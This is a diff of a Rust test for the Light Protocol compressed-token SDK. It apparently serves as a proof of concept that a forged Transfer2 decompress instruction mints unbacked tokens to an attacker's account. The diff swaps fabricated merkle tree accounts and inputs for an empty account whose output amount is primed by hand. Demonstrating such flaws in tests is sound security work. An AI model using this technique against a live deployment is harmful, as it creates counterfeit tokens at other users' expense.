@@ -12,11 +12,7 @@ use light_compressed_token_sdk::{
         CTokenAccount2,
     },
     ctoken::{derive_ctoken_ata, CompressibleParams, CreateAssociatedTokenAccount},
-    utils::CTokenDefaultAccounts,
     ValidityProof,
-};
-use light_ctoken_types::{
-    instructions::transfer2::MultiInputTokenDataWithContext, state::TokenDataVersion,
 };
 use light_program_test::{LightProgramTest, ProgramTestConfig};
 use light_sdk::instruction::PackedAccounts;
@@ -24,7 +20,7 @@ use light_test_utils::{
     airdrop_lamports,
     spl::{create_mint_helper, mint_spl_tokens},
 };
-use solana_sdk::{signature::Keypair, signer::Signer, system_instruction, transaction::Transaction};
+use solana_sdk::{signature::Keypair, signer::Signer, transaction::Transaction};
 use solana_sdk::program_pack::Pack;
 use light_program_test::Rpc;
 
@@ -92,94 +88,24 @@ async fn test_transfer2_ctoken_decompress_mints_unbacked_tokens() {
     // Transfer2 in Decompress mode mints unbacked tokens when no compressed deposit exists.
     let exploit_amount = 1_000_000u64;
 
-    // Manually craft fake input metadata to satisfy the instruction encoding.
+    // Manually craft packed accounts but avoid providing any compressed inputs so the system
+    // program's create_inputs_cpi_data path is skipped entirely.
     let mut packed_accounts = PackedAccounts::default();
-
-    // Fake merkle tree / queue entries so indices exist. These are created with the
-    // account-compression program as owner so Transfer2 will include them in the CPI
-    // account slice, but they contain no real state.
-    let fake_tree = Keypair::new();
-    let fake_queue = Keypair::new();
-
-    let rent_exempt = rpc
-        .get_minimum_balance_for_rent_exemption(0)
-        .await
-        .unwrap();
-    let default_accounts = CTokenDefaultAccounts::default();
-    let create_fake_tree = system_instruction::create_account(
-        &payer.pubkey(),
-        &fake_tree.pubkey(),
-        rent_exempt,
-        0,
-        &default_accounts.account_compression_program,
-    );
-    let create_fake_queue = system_instruction::create_account(
-        &payer.pubkey(),
-        &fake_queue.pubkey(),
-        rent_exempt,
-        0,
-        &default_accounts.account_compression_program,
-    );
-    rpc
-        .create_and_send_transaction(
-            &[create_fake_tree, create_fake_queue],
-            &payer.pubkey(),
-            &[&payer, &fake_tree, &fake_queue],
-        )
-        .await
-        .unwrap();
-
-    // Insert tree/queue first to mirror the ordering used by the standard decompression helper.
-    let tree_index = packed_accounts.insert_or_get(fake_tree.pubkey());
-    let queue_index = packed_accounts.insert_or_get(fake_queue.pubkey());
 
     // Mint account (read-only)
     let mint_index = packed_accounts.insert_or_get_read_only(mint);
-    // Attacker (acts as both owner and signer for fabricated input)
+    // Attacker (acts as both owner and signer)
     let owner_index = packed_accounts.insert_or_get_config(attacker.pubkey(), true, false);
     // Ctoken ATA recipient
     let ctoken_index = packed_accounts.insert_or_get_config(ctoken_ata, false, true);
 
-    let fake_input = MultiInputTokenDataWithContext {
-        owner: owner_index,
-        amount: exploit_amount,
-        has_delegate: false,
-        delegate: 0,
-        mint: mint_index,
-        version: TokenDataVersion::ShaFlat as u8,
-        merkle_context: light_compressed_account::compressed_account::PackedMerkleContext {
-            merkle_tree_pubkey_index: tree_index,
-            queue_pubkey_index: queue_index,
-            leaf_index: 0,
-            prove_by_index: true,
-        },
-        root_index: 0,
-    };
-
-    // The compression entry uses Decompress mode and targets the attacker ctoken ATA.
-    let mut forged_account = CTokenAccount2 {
-        inputs: vec![fake_input],
-        output: light_ctoken_types::instructions::transfer2::MultiTokenTransferOutputData {
-            owner: owner_index,
-            amount: 0,
-            has_delegate: false,
-            delegate: 0,
-            mint: mint_index,
-            version: TokenDataVersion::ShaFlat as u8,
-        },
-        compression: Some(
-            light_ctoken_types::instructions::transfer2::Compression::decompress_ctoken(
-                exploit_amount,
-                mint_index,
-                ctoken_index,
-            ),
-        ),
-        delegate_is_set: false,
-        method_used: false,
-    };
-
-    // Clear any outputs so only the forged compression executes.
-    forged_account.output.amount = 0;
+    // Construct an empty CTokenAccount2 and manually prime its output amount so
+    // decompress_ctoken will accept the forged amount even without any backing inputs.
+    let mut forged_account = CTokenAccount2::new_empty(owner_index, mint_index);
+    forged_account.output.amount = exploit_amount;
+    forged_account
+        .decompress_ctoken(exploit_amount, ctoken_index)
+        .unwrap();
 
     let (account_metas, _, _) = packed_accounts.to_account_metas();
     let transfer_inputs = Transfer2Inputs {
@@ -189,9 +115,8 @@ async fn test_transfer2_ctoken_decompress_mints_unbacked_tokens() {
         meta_config: Transfer2AccountsMetaConfig::new(payer.pubkey(), account_metas),
         in_lamports: None,
         out_lamports: None,
-        // The output queue index is present only to satisfy encoding; it is not backed by any
-        // real compressed deposit or proof.
-        output_queue: queue_index,
+        // No output queue is needed because we never touch a real compressed state tree.
+        output_queue: 0,
     };
 
     let exploit_ix = create_transfer2_instruction(transfer_inputs).unwrap();
